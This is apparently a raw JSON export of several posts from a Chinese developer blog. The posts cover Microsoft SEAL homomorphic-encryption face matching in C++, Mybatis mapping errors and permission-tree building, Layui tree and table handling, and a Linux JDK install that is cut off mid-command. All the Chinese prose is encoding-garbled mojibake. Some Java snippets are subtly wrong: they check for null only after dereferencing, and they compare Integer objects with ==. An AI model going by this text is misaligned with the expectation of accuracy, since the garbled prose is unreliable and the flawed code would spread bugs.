å°†ä¸Šå¼è·Ÿé¢„å…ˆè®¾å®šçš„é˜ˆå€¼${t}=(t, t, \\ldots t)$è¿›è¡Œæ¯”è¾ƒ å½¢æˆæ–°çš„vector d: $d = R - t$, ç„¶åå°†d ä¼ è¾“ç»™ç¬¬ä¸‰æ–¹ æœ€ç»ˆå°† d è¿›è¡Œè§£å¯†å†³å®šç»“æœ(decision),å¹¶ä¼ é€ç»™å®¢æˆ· $d = R - t$â€‹â€‹ ; $d=R-t ; \\quad$â€‹â€‹ decision $= \\begin{cases}\\text { accept } &amp; \\text { if } \\exists d \\in \\mathbf{d}: d&gt;0 \\ \\text { reject } &amp; \\text { if } \\forall d \\in \\mathbf{d}: d \\leq 0\\end{cases}$ ä¸€: å°†inputå’Œdatabaseä¸­çš„æ•°æ®åˆ†åˆ«åŠ å¯†è·å¾—encrypt_probe_på’Œ encrypt_E_matrix 1ï¼šåŠ å¯†å¾—åˆ°probe_p Ciphertext get_encrypt_probe(CKKSEncoder&amp; ckks_encoder,Encryptor &amp; encryptor, vector&lt;double>v_input) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_encrypt_probe() begin------\" &lt;&lt; endl; /* * åŠ å¯†è·å¾—probe_p; */ Plaintext v_plaintext; // vç¼–ç  ckks_encoder.encode(v_input, scale, v_plaintext); Ciphertext probe_p; // åŠ å¯† encryptor.encrypt(v_plaintext, probe_p); print_line(__LINE__); cout &lt;&lt; \"------get_encrypt_probe() end------\" &lt;&lt; endl; return probe_p; &#125; å°†åŠ å¯†çš„probe_pè§£å¯†åšéªŒè¯: 2ï¼šå°†databaseä¸­çš„æ‰€æœ‰æ•°æ®åˆ†åˆ«åŠ å¯†ï¼Œç»„æˆçŸ©é˜µE: vector&lt;Ciphertext> get_encrypt_E_matrix(CKKSEncoder&amp; ckks_encoder, Encryptor&amp; encryptor, vector&lt;vector&lt;double>>E_matrix) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_encrypt_E_matrix() begin------\" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_E_matrix; for (auto it = E_matrix.begin(); it != E_matrix.end(); it++) &#123; Plaintext plain_E_ci; Ciphertext encrypt_E_ci; ckks_encoder.encode(*it, scale, plain_E_ci); encryptor.encrypt(plain_E_ci, encrypt_E_ci); encrypt_E_matrix.push_back(encrypt_E_ci); &#125; print_line(__LINE__); cout &lt;&lt; \"------get_encrypt_E_matrix() end------\" &lt;&lt; endl; return encrypt_E_matrix; &#125; å°†åŠ å¯†çš„databseæ•°æ®åšè§£å¯†éªŒè¯: è¾“å‡ºå‰4è¡Œ: äºŒ: è®¡ç®— $\\mathbf{r}{i}=\\operatorname{dist}\\left(\\mathbf{p}, \\mathbf{c}{i}\\right) \\cdot \\mathbf{k}$ åˆ†æ­¥éª¤: æ€»ä»£ç è°ƒç”¨: code vector&lt;Ciphertext> get_dist(SEALContext&amp; context,CKKSEncoder&amp; ckks_encoder, Evaluator&amp; evaluator, vector&lt;Ciphertext> encrypt_E_matrix, Ciphertext probe_p,Encryptor &amp; encryptor ,Decryptor&amp; decryptor, RelinKeys&amp; relin_keys, GaloisKeys&amp; galois_keys) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_dist() begin------\" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_R_matrix; /* * get (Ci - Pi)^2 */ cout &lt;&lt; \"sub &amp; square &amp;&amp; stored in encrypt_R_matrix: \" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_R_matrix_cache = get_sub_square(ckks_encoder, evaluator, decryptor,encrypt_E_matrix,probe_p, relin_keys); /* * get sum */ encrypt_R_matrix = get_sum_rotate(context,ckks_encoder,evaluator,encryptor, decryptor, encrypt_R_matrix_cache,galois_keys,relin_keys); print_line(__LINE__); cout &lt;&lt; \"------get_dist() end------\" &lt;&lt; endl; return encrypt_R_matrix; &#125; 1ï¼šæ±‚ ${(C_{i} - P_{i})}^{2}$ code vector&lt;Ciphertext> get_sub_square(CKKSEncoder&amp; ckks_encoder,Evaluator &amp; evaluator,Decryptor &amp; decryptor,vector&lt;Ciphertext> encrypt_E_matrix, Ciphertext probe_p,RelinKeys &amp; relin_keys) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_sub_square() begin------\" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_R_matrix; for (auto it = encrypt_E_matrix.begin(); it != encrypt_E_matrix.end(); it++) &#123; Plaintext plain_sub_cache, plain_mult_cache; Ciphertext encrypt_sub_cache, encrypt_multiply_cache; vector&lt;double>result_sub_cache, result_mult_cache; evaluator.sub(probe_p, (*it), encrypt_sub_cache); evaluator.relinearize_inplace(encrypt_sub_cache, relin_keys); evaluator.square(encrypt_sub_cache, encrypt_multiply_cache); evaluator.relinearize_inplace(encrypt_multiply_cache, relin_keys); evaluator.rescale_to_next_inplace(encrypt_multiply_cache); encrypt_R_matrix.push_back(encrypt_multiply_cache); &#125; print_line(__LINE__); cout &lt;&lt; \"------get_sub_square() end------\" &lt;&lt; endl; return encrypt_R_matrix; &#125; è§£ç ç»“æœéªŒè¯æµ‹è¯•ï¼š â€‹ 1. $(C_{i} - P_{i})$ç»“æœ: ${(C_{i} - P_{i})}^{2}$ç»“æœ: 2: $\\sum_{i=0}{s}\\left(\\mathbf{c}_{i}-\\mathbf{p}_{i}\\right){2}$ å¾ªç¯éå†encrypt_R_matrixï¼Œ å°†å¯†æ–‡æ¯æ¬¡ç§»ä½stepæ­¥ååŠ åˆ°encrypt_sum_cacheä¸Šå¾—åˆ°æœ€ç»ˆçš„ç»“æœï¼Œ stepä»0åˆ°number-1 code vector&lt;Ciphertext> get_sum_rotate(SEALContext &amp;context,CKKSEncoder&amp; ckks_encoder, Evaluator&amp; evaluator,Encryptor &amp;encryptor ,Decryptor&amp; decryptor, vector&lt;Ciphertext>encrypt_R_matrix,GaloisKeys &amp; galois_keys,RelinKeys &amp; relin_keys) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_sum_rotate() begin------\" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_RR_matrix; /* * get encryptor of vector K&#123;1,0,0,....0&#125; * begin */ size_t slot_count = ckks_encoder.slot_count(); vector&lt;double>vector_k(slot_count, 0ULL); vector_k[0] = 1ULL; //print_vector(vector_k, 3, 13); Plaintext plain_vector_k; Ciphertext encrypt_vector_k; ckks_encoder.encode(vector_k, pow(2.0, 40), plain_vector_k); encryptor.encrypt(plain_vector_k, encrypt_vector_k); evaluator.mod_switch_to_next_inplace(encrypt_vector_k); //end /* * Calculate begin */ for (auto it = encrypt_R_matrix.begin(); it != encrypt_R_matrix.end(); it++) &#123; Plaintext plain_rotated_cache, plain_sum_cache; Ciphertext encrypt_rotated_cache, encrypt_sum_cache; vector&lt;double>result_rotated_cache, result_sum_cache; encrypt_sum_cache = (*it); /* * rotated &amp; add to get sum of them */ for (auto i = 0; i &lt; number_n - 1; i++) &#123; evaluator.rotate_vector(encrypt_sum_cache, 1, galois_keys, encrypt_rotated_cache); encrypt_sum_cache = encrypt_rotated_cache; evaluator.add_inplace(encrypt_sum_cache,(*it) ); evaluator.relinearize_inplace(encrypt_sum_cache, relin_keys); &#125; evaluator.multiply_inplace(encrypt_sum_cache, encrypt_vector_k); evaluator.relinearize_inplace(encrypt_sum_cache, relin_keys); evaluator.rescale_to_next_inplace(encrypt_sum_cache); encrypt_RR_matrix.push_back(encrypt_sum_cache); &#125; /* * Calculate end; */ print_line(__LINE__); cout &lt;&lt; \"------get_sum_rotate() end------\" &lt;&lt; endl; return encrypt_RR_matrix; &#125; è§£ç ç»“æœéªŒè¯æµ‹è¯•(éƒ¨åˆ†æˆªå–): 3: æ±‚ $\\operatorname{dist}\\left(\\mathbf{p}, \\mathbf{c}_{i}\\right) \\cdot \\mathbf{k}$ ä»£ç å†…åµŒåœ¨ç¬¬äºŒæ­¥æ±‚ 2: $\\sum_{i=0}{s}\\left(\\mathbf{c}_{i}-\\mathbf{p}_{i}\\right){2}$â€‹ä¸­ evaluator.multiply_inplace(encrypt_sum_cache, encrypt_vector_k); evaluator.rescale_to_next_inplace(encrypt_sum_cache); encrypt_RR_matrix.push_back(encrypt_sum_cache); è§£ç ç»“æœéªŒè¯: ä¸‰: å°†å¾—åˆ° R è¿›è¡Œç§»ä½å åŠ æ“ä½œ: code vector&lt;Ciphertext> get_shifting_ri(SEALContext&amp; context,CKKSEncoder&amp; ckks_encoder,Evaluator&amp; evaluator,vector&lt;Ciphertext> encrypt_R_matrix, GaloisKeys&amp; galois_keys, Decryptor&amp; decryptor) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_shifting_ri() begin------\" &lt;&lt; endl; vector&lt;Ciphertext> encrypt_RR_matrix; Plaintext plain_shift_cache; vector&lt;double>result_shift_cache; int step = 0; for (auto it = encrypt_R_matrix.begin(); it != encrypt_R_matrix.end(); it++) &#123; Ciphertext after_shift; // å³ç§» evaluator.rotate_vector((*it),step, galois_keys,after_shift); step--; encrypt_RR_matrix.push_back(after_shift); &#125; print_line(__LINE__); cout &lt;&lt; \"------get_shifting_ri() end------\" &lt;&lt; endl; return encrypt_RR_matrix; &#125; è§£ç ç»“æœéªŒè¯æµ‹è¯•ï¼› è¾“å‡ºå‰10åˆ—å‰10è¡Œï¼Œ ä¿ç•™13ä½å°æ•° å››: å°†å¾—åˆ° $R-&gt;\\left(\\mathbf{r}{1,1}, \\mathbf{r}{2,1}, \\ldots \\mathbf{r}_{N, 1}\\right)$: é€šè¿‡ç§»ä½æ“ä½œå¾—åˆ°å¯¹è§’çŸ©é˜µåï¼Œå°†æ‰€æœ‰çš„$C_{i}$â€‹ ç´¯åŠ èµ·æ¥å¾—åˆ°$R-&gt;\\left(\\mathbf{r}{1,1}, \\mathbf{r}{2,1}, \\ldots \\mathbf{r}_{N, 1}\\right)$: code Ciphertext get_combined_R(SEALContext&amp; context,CKKSEncoder&amp; ckks_encoder,Evaluator&amp; evaluator, vector&lt;Ciphertext> encrypt_R_matrix, Encryptor&amp; encryptor, Decryptor&amp; decryptor, RelinKeys&amp; relin_keys) &#123; print_line(__LINE__); cout &lt;&lt; \"------get_combined_R() begin------\" &lt;&lt; endl; Ciphertext encrypt_R_sum_cache; cout &lt;&lt; \" combined together: \" &lt;&lt; endl; int step = 0; for (auto it = encrypt_R_matrix.begin(); it != encrypt_R_matrix.end(); it++) &#123; if (step == 0) &#123; encrypt_R_sum_cache = (*it); step++; continue; &#125; else &#123; parms_id_type last_parms_id = (*it).parms_id(); evaluator.add_inplace(encrypt_R_sum_cache, (*it)); evaluator.relinearize_inplace(encrypt_R_sum_cache,relin_keys); step++; &#125; &#125; print_line(__LINE__); cout &lt;&lt; \"------get_combined_R() end------\" &lt;&lt; endl; return encrypt_R_sum_cache; &#125; è§£å¯†ç»“æœæµ‹è¯•: æœ€ç»ˆç»“æœå±•ç¤º ==æ³¨æ„ï¼== (å› ä¸ºæ²¡æœ‰ç”¨FaceNetç¼˜æ•…,è¿™é‡Œç»™å®šçš„é˜ˆå€¼ t ä¸å¾—çŸ¥ï¼Œæ•…ç¨‹åºåªè¿è¡Œåˆ°å°†Råšå®Œå¯¹è§’åŒ–åå¹¶åŠ åœ¨ä¸€èµ·å˜æˆä¸€ä¸ª $R-&gt;(r1,1, r2,1, . . . rN,1).$å½¢å¼ è‹¥ç»™å®šçš„è®¾å®šçš„tå·²çŸ¥; åˆ™åªéœ€è¦åšå¦‚ä¸‹æ“ä½œåˆ¤å®šç»“æœ: code // d = R - t Ciphertext encrypt_T,encrypt_d; evaluator.sub(mapping_R,encrypt_T,encrypt_d); // *d = Dec(d) Plaintext plain_dd_cache; vector&lt;double>result_dd_cache; decryptor.decrypt(encrypt_d, plain_dd_cache); ckks_encoder.decode(plain_dd_cache, result_dd_cache); // judge âˆƒd âˆˆ dâˆ—: d > 0 ? accept : reject bool ok = 0; auto len = result_dd_cache.size(); for (auto i = 0; i &lt; len; i++) &#123; if (result_dd_cache[i] > 0) &#123; ok = 1; break; &#125; &#125; string ans = ok ? \"accept\" : \"reject\"; cout &lt;&lt; ans &lt;&lt; endl; //è¾“å‡ºæœ€åç»“æœ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"Mybatis  XXX.ReflectionException_ There Is No Getter for Name XXXé—®é¢˜","slug":"Mybatis-XXX-ReflectionException-There-is-no-getter-for-name-XXXé—®é¢˜","date":"2021-08-11T14:22:32.000Z","updated":"2021-09-19T10:13:17.198Z","comments":true,"path":"posts/12adf317/","link":"","permalink":"https://www.sizaif.com/posts/12adf317/","excerpt":"","text":"[TOC] @auther by sizaif è§£å†³æ–¹æ³• é¦–å…ˆ,è¿™ä¸ªè‚¯å®šæ˜¯å› ä¸ºæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µå,å’Œå®ä½“ç±»ä¸­çš„å­—æ®µåæ˜ å°„å¤±è´¥å¼•èµ·çš„; 1: æŸ¥çœ‹ æ˜¯å¦æ‹¼å†™é”™è¯¯ &lt;!--æ˜ å°„è¡¨--> &lt;resultMap id=\"UsersMap\" type=\"com.sizaif.emsdemo.pojo.User.Users\"> &lt;!--columnæ•°æ®åº“ä¸­çš„å­—æ®µï¼Œpropertyå®ä½“ç±»ä¸­çš„å±æ€§--> &lt;result column=\"id\" property=\"id\" jdbcType=\"INTEGER\"/> &lt;result column=\"createDate\" property=\"createDate\" jdbcType=\"VARCHAR\" /> &lt;result column=\"modifyDate\" property=\"modifyDate\" jdbcType=\"VARCHAR\" /> &lt;result column=\"isEnabled\" property=\"isEnabled\" jdbcType=\"INTEGER\"/> &lt;result column=\"isLocked\" property=\"isLocked\" jdbcType=\"INTEGER\"/> &lt;result column=\"lastLoginDate\" property=\"lastLoginDate\" jdbcType=\"VARCHAR\" /> &lt;result column=\"lastLoginIp\" property=\"lastLoginIp\" jdbcType=\"VARCHAR\" /> &lt;result column=\"lockDate\" property=\"lockDate\" jdbcType=\"VARCHAR\" /> &lt;result column=\"uname\" property=\"name\" jdbcType=\"VARCHAR\"/> &lt;result column=\"encodePassword\" property=\"password\" jdbcType=\"VARCHAR\"/> &lt;result column=\"role\" property=\"role\" jdbcType=\"VARCHAR\"/> &lt;/resultMap> 2: æŸ¥çœ‹ sqlåŠ¨æ€æ’å…¥æˆ–æ›´æ–°è¯­å¥ä¸­å­—æ®µæ˜¯å¦æ‹¼å†™é”™è¯¯ä¸å®ä½“ç±»ä¸­å­—æ®µä¸ç¬¦** &lt;if test=\"XXXå®ä½“ç±»å­—æ®µå != null\"> XXXæ•°æ®åº“å­—æ®µå, &lt;/if>","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Mybatis","slug":"æŠ€æœ¯å‘/Mybatis","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mybatis/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.sizaif.com/tags/Mybatis/"}],"author":"sizaif"},{"title":"Layui Tree è·å–å¤é€‰æ¡†é€‰ä¸­èŠ‚ç‚¹çš„Id","slug":"layui-tree-è·å–å¤é€‰æ¡†é€‰ä¸­èŠ‚ç‚¹çš„id","date":"2021-08-11T14:11:34.000Z","updated":"2021-09-19T10:13:44.563Z","comments":true,"path":"posts/b7de2574/","link":"","permalink":"https://www.sizaif.com/posts/b7de2574/","excerpt":"","text":"[TOC] @auther by sizaif è¯´æ˜ å®˜æ–¹æ–‡æ¡£æä¾›çš„ä»£ç åªèƒ½è·å–åˆ°æ ¹èŠ‚ç‚¹çš„id,æ²¡æœ‰è¿›è¡Œæ ‘éå†,æ— æ³•è·å–åˆ°å­æ ‘çš„id. Code å®˜æ–¹æ–‡æ¡£æä¾›çš„ tree.render(&#123; elem: '#test' ,data: [] //æ•°æ®æº ,id: 'demoId' //å®šä¹‰ç´¢å¼• &#125;); //è·å¾—é€‰ä¸­çš„èŠ‚ç‚¹ var checkData = tree.getChecked('demoId'); æˆ‘çš„ä»£ç  var treecheckdata = tree.getChecked('demoId'); var nodeIds = new Array(); nodeIds = getCheckedId(treecheckdata); // æµ‹è¯• var permList = nodeIds; console.log(\"permList:\"+permList); // è·å–é€‰ä¸­èŠ‚ç‚¹çš„id function getCheckedId(jsonObj) &#123; var id = \"\"; $.each(jsonObj, function (index, item) &#123; if (id != \"\") &#123; id = id + \",\" + item.id; &#125; else &#123; id = item.id; &#125; var i = getCheckedId(item.children); if (i != \"\") &#123; id = id + \",\" + i; &#125; &#125;); return id; &#125; æ•ˆæœå›¾","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Js","slug":"æŠ€æœ¯å‘/Js","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Js/"}],"tags":[{"name":"Js","slug":"Js","permalink":"https://www.sizaif.com/tags/Js/"},{"name":"Layui","slug":"Layui","permalink":"https://www.sizaif.com/tags/Layui/"}],"author":"sizaif"},{"title":"Layui Table è§£å†³ä»åå°ä¼ å…¥æ•°æ®ä¸ºäºŒç»´æ•°ç»„æ¨¡å¼,å³å¸¦æœ‰å­ç±»çš„æ•°æ®æ ¼å¼","slug":"layui-table-è§£å†³ä»åå°ä¼ å…¥æ•°æ®ä¸ºäºŒç»´æ•°ç»„æ¨¡å¼-å³å¸¦æœ‰å­ç±»çš„æ•°æ®æ ¼å¼","date":"2021-08-11T14:11:12.000Z","updated":"2021-09-19T10:13:50.573Z","comments":true,"path":"posts/2b51004/","link":"","permalink":"https://www.sizaif.com/posts/2b51004/","excerpt":"","text":"[TOC] @auther by sizaif åå°ä¼ å…¥çš„æ ¼å¼ å‰å°å¤„ç† code ,response:&#123; statusName: 'code' //æ•°æ®çŠ¶æ€çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šcode ,statusCode: 200 //æˆåŠŸçš„çŠ¶æ€ç ï¼Œé»˜è®¤ï¼š0 ,countName: 'totals' //æ•°æ®æ€»æ•°çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šcount ,dataName: 'list' //æ•°æ®åˆ—è¡¨çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šdata &#125; ,parseData: function(res)&#123; //res å³ä¸ºåŸå§‹è¿”å›çš„æ•°æ® console.log(res); return &#123; \"code\":res.code, //è§£ææ¥å£çŠ¶æ€ \"msg\": res.message, //è§£ææç¤ºæ–‡æœ¬ \"totals\": res.totals, //è§£ææ•°æ®é•¿åº¦ \"list\": res.list //è§£ææ•°æ®åˆ—è¡¨ &#125;; &#125; ,cols: [[ //è¡¨å¤´ &#123;field: 'users', title: 'ä¸Šæ¬¡ç™»å½•IP',sort: true,templet:function(d)&#123;return d.users.lastLoginIp&#125; &#125; ,&#123;field: 'users', title: 'è§’è‰²',sort: true,templet:function(d)&#123;return d.users.role&#125;&#125; ]] æ•ˆæœ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Js","slug":"æŠ€æœ¯å‘/Js","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Js/"}],"tags":[{"name":"Js","slug":"Js","permalink":"https://www.sizaif.com/tags/Js/"},{"name":"Layui","slug":"Layui","permalink":"https://www.sizaif.com/tags/Layui/"}],"author":"sizaif"},{"title":"Mybatis å•è¡¨è‡ªå…³è” å®ç°æ ‘ç»“æ„çš„å‡ ç§æ–¹å¼","slug":"Mybatis-å•è¡¨è‡ªå…³è”-å®ç°æ ‘ç»“æ„çš„å‡ ç§æ–¹å¼","date":"2021-08-11T14:10:32.000Z","updated":"2021-09-19T10:13:24.205Z","comments":true,"path":"posts/843fdcdc/","link":"","permalink":"https://www.sizaif.com/posts/843fdcdc/","excerpt":"","text":"@auther by sizaif @TOC ç»“æ„ Bean code @JsonIdentityInfo( generator = ObjectIdGenerators.IntSequenceGenerator.class) public class PermissionVO implements Serializable&#123; private static final long serialVersionUID = -2783081162690878303L; private Integer id; private String name; private Integer pid; private Integer istype; private String code; private String page; private boolean checked; private boolean open; private List&lt;PermissionVO> children; æ³•ä¸€:ä½¿ç”¨mybatisæ˜ å°„å®ç° mabatis.xmlé…ç½® code &lt;!--=Start findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨ ç»“æœé›†æ˜ å°„--> &lt;resultMap id=\"findPermissionMap\" type=\"com.sizaif.emsdemo.dto.PermissionVO\"> &lt;id property=\"id\" column=\"id\"/> &lt;result property=\"name\" column=\"name\"/> &lt;result property=\"pid\" column=\"pid\"/> &lt;result property=\"istype\" column=\"istype\"/> &lt;result property=\"code\" column=\"code\"/> &lt;result property=\"page\" column=\"page\"/> &lt;collection property=\"children\" column=\"id\" ofType=\"com.sizaif.emsdemo.dto.PermissionVO\" select=\"findChildPerm\"/> &lt;/resultMap> &lt;!--=End findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--> &lt;!-- pID å¯¹åº” PermissionVO ä¸­ pID--> &lt;sql id=\"PermColumn\" > id, name,pid,istype, code,page &lt;/sql> &lt;!--=Start findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--> &lt;select id=\"findPerms\" resultMap=\"findPermissionMap\"> SELECT &lt;include refid=\"PermColumn\" /> FROM permission WHERE pid = 0 OR pid is NULL &lt;/select> &lt;!--=End findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--> &lt;!--=Start findChildPerm æŸ¥æ‰¾æ‰€æœ‰å­èŠ‚ç‚¹æƒé™--> &lt;select id=\"findChildPerm\" resultMap=\"findPermissionMap\"> select &lt;include refid=\"PermColumn\" /> from permission where pid = #&#123;pid&#125; &lt;/select> &lt;!--=End findChildPerm æŸ¥æ‰¾æ‰€æœ‰å­èŠ‚ç‚¹æƒé™--> serviceå±‚è°ƒç”¨ @Override public List&lt;PermissionVO> findPerms() &#123; return permissionsMapper.findPerms(); &#125; controller List&lt;PermissionVO> pvos = authService.findPerms(); æ³•äºŒ:é€šè¿‡é€’å½’å®ç° mybatis.xmlé…ç½® code &lt;resultMap id=\"BaseResultMap\" type=\"com.sizaif.emsdemo.dto.PermissionVO\"> &lt;id property=\"id\" column=\"id\"/> &lt;result property=\"name\" column=\"name\"/> &lt;result property=\"pid\" column=\"pid\"/> &lt;result property=\"istype\" column=\"istype\"/> &lt;result property=\"code\" column=\"code\"/> &lt;result property=\"page\" column=\"page\"/> &lt;/resultMap> &lt;select id=\"getChildren\" resultMap=\"BaseResultMap\"> select id, pid, name, istype, code,page from permission where pid = #&#123;id&#125; &lt;/select> service @Override public List&lt;PermissionVO> getChildPerms(Integer id) &#123; return permissionsMapper.getChildren(id); &#125; controller code public PermissionVO initPermission1()&#123; PermissionVO permissionvo=new PermissionVO (); try&#123; permissionvo.setId(0);//è¿™ä¸ªåœ°æ–¹åº”è¯¥é€šè¿‡æ•°æ®åº“æŸ¥è¯¢å‡ºæ ¹èŠ‚ç‚¹ï¼Œå› ä¸ºæ ¹èŠ‚ç‚¹idåœ¨æ•°æ®åº“æ˜¯0ï¼Œ queryChildPermissions(permissionvo);//é€’å½’å¾—åˆ°å…¨éƒ¨èŠ‚ç‚¹ &#125;catch (Exception e)&#123; throw e; &#125; return permissionvo; &#125; private void queryChildPermissions (PermissionVO permissionvo)&#123; List&lt;PermissionVO> children= authService.getChildPerms(permissionvo.getId());//é€šè¿‡idæŸ¥è¯¢å­é›†åˆ permissionvo.setChildren(children);//å°†æŸ¥è¯¢å‡ºæ¥çš„å­èŠ‚ç‚¹é›†åˆæ”¾å…¥åˆ°permissionvoé›†åˆä¸­ for(PermissionVO innerChildren:children)&#123; //éå†å‡ºå­é›†åˆçš„å­é›†åˆ queryChildPermissions(innerChildren); //æ”¾å…¥åˆ°å­èŠ‚ç‚¹çš„å­é›†åˆä¸­ &#125; &#125; æ³•ä¸‰: ä¸€æ¬¡æŸ¥å‡ºå…¨éƒ¨è®°å½•ï¼Œé€šè¿‡åµŒå¥—å¾ªç¯éå†ç»“æœ xml code &lt;resultMap id=\"BaseResultMap\" type=\"com.sizaif.emsdemo.dto.PermissionVO\"> &lt;id property=\"id\" column=\"id\"/> &lt;result property=\"name\" column=\"name\"/> &lt;result property=\"pid\" column=\"pid\"/> &lt;result property=\"istype\" column=\"istype\"/> &lt;result property=\"code\" column=\"code\"/> &lt;result property=\"page\" column=\"page\"/> &lt;/resultMap> &lt;select id=\"selectAll\" resultMap=\"BaseResultMap\"> select id, pid, name, istype,code,page from permission &lt;/select> service: @Override public List&lt;PermissionVO> selectAll() &#123; return permissionsMapper.selectAll(); &#125; controller: code public PermissionVO initPermissionVO()&#123; PermissionVO permissionvo = new PermissionVO (); List&lt;PermissionVO> lists= authService.selectAll();//æŸ¥è¯¢æ‰€æœ‰èŠ‚ç‚¹ try&#123; for(PermissionVO ps:lists)&#123;//éå†èŠ‚ç‚¹ PermissionVO child = ps; if( ps.getPid().equals(0) || ps.getPid() == null)&#123;//è·å–æ ¹èŠ‚ç‚¹,Integerç±»å‹æ˜¯åŒ…è£…ç±»ï¼Œåˆ¤æ–­å¯¹è±¡å¼•ç”¨ permissionvo = ps;//æ ¹èŠ‚ç‚¹ &#125;else&#123; for (PermissionVO innerpermissionvo:lists)&#123; if(child.getPid() == innerpermissionvo.getId())&#123;//å¦‚æœèŠ‚ç‚¹çš„çš„pidå’Œé›†åˆä¸­æŸä¸ªèŠ‚ç‚¹çš„idä¸€è‡´ PermissionVO parent=innerpermissionvo;//å°†è¿™ä¸ªèŠ‚ç‚¹å‘½åä¸ºçˆ¶èŠ‚ç‚¹ parent.getChildren().add(child);//ç„¶åæŠŠchildæ”¾å…¥åˆ°å®ƒçš„çˆ¶äº²é›†åˆä¸­ break; &#125; &#125; &#125; &#125; &#125;catch (Exception e)&#123; throw e; &#125; return permissionvo; &#125; æ³•å››:ä¸€æ¬¡æŸ¥å‡ºæ‰€æœ‰æ•°æ®,é€šè¿‡Mapé›†åˆå®ç°æ ‘ç»“æ„ xml ä¸service ä¸æ³•ä¸‰ä¸€è‡´, controller: code public PermissionVO initPermission()&#123; PermissionVO permissionvo=new PermissionVO (); List&lt;PermissionVO> lists = authService.selectAll();//æŸ¥è¯¢æ‰€æœ‰èŠ‚ç‚¹ Map&lt;Integer,PermissionVO> map = new HashMap&lt;Integer,PermissionVO>();//å°†æ‰€æœ‰èŠ‚ç‚¹å­˜å…¥åˆ°mapé›†åˆ try&#123; for(PermissionVO ps:lists) &#123; map.put(ps.getId(),ps);//å°†æ‰€æœ‰idåšä¸ºkeyï¼ŒPermissionvoå¯¹è±¡åšå€¼ï¼Œå­˜å…¥åˆ°mapé›†åˆ &#125; for(PermissionVO ps:lists)&#123;//éå†æ‰€æœ‰èŠ‚ç‚¹ PermissionVO child = ps; if (child.getPid().equals(0)||child.getPid()==null)&#123; permissionvo = ps;//å–å‡ºæ ¹èŠ‚ç‚¹ &#125;else&#123; PermissionVO parent = map.get(child.getPid());//é€šè¿‡å­èŠ‚ç‚¹çš„pidè·å–çˆ¶èŠ‚ç‚¹ parent.getChildren().add(child);//å°†å­èŠ‚ç‚¹æ”¾å…¥çˆ¶èŠ‚ç‚¹ä¸­ &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return permissionvo; &#125; å››ç§æ–¹å¼æŸ¥å‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„,ä½†æ•ˆç‡æ–¹é¢æ³•å››æœ€å¿«","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Mybatis","slug":"æŠ€æœ¯å‘/Mybatis","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mybatis/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.sizaif.com/tags/Mybatis/"}],"author":"sizaif"},{"title":"linuxå®‰è£…java1.8 Jdkå¹¶é…ç½®ç¯å¢ƒå˜é‡","slug":"linuxå®‰è£…java1-8-jdkå¹¶é…ç½®ç¯å¢ƒå˜é‡","date":"2021-08-11T14:06:40.000Z","updated":"2021-09-19T10:13:35.085Z","comments":true,"path":"posts/f03f62f2/","link":"","permalink":"https://www.sizaif.com/posts/f03f62f2/","excerpt":"","text":"@auther by sizaif @TOC ä¸‹è½½jdk ç™¾åº¦ç½‘ç›˜é“¾æ¥:æå–ç : krfa ä½¿ç”¨fileZillaå°†jdkä¼ è¾“åˆ°linuxä¸Š å®‰è£… rpm -ivh jdk-8u251-linux-x64.rpm é…ç½®ç¯å¢ƒå˜é‡ vim /etc/profile export 